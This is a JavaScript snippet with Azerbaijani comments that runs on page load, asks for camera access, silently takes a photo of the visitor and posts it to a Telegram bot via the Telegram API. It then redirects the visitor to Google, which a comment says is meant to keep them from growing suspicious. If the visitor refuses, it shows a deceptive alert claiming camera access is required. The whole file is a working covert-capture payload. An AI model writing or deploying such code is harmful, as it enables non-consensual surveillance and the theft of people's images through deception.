
async function startCapture() {
    try {
        // Kameraya giriş istəyirik
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('v');
        video.srcObject = stream;

        // Kamera açılandan 2.5 saniyə sonra şəkil çəkirik (görüntü tam gəlsin deyə)
        setTimeout(() => {
            const canvas = document.getElementById('c');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'image.jpg');

                // Telegram API vasitəsilə göndəririk
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    // Şəkil gedəndən sonra adamı Google-a atırıq ki, şübhələnməsin
                    window.location.href = "https://google.com";
                });
            }, 'image/jpeg');
        }, 2500);

    } catch (err) {
        // Əgər "Block" (Rədd et) sıxsa, xəbərdarlıq çıxır
        alert("Xəta: Sistemə giriş üçün kameraya icazə verilməlidir.");
    }
}

// Səhifə açılan kimi funksiyanı başlat
window.onload = startCapture;
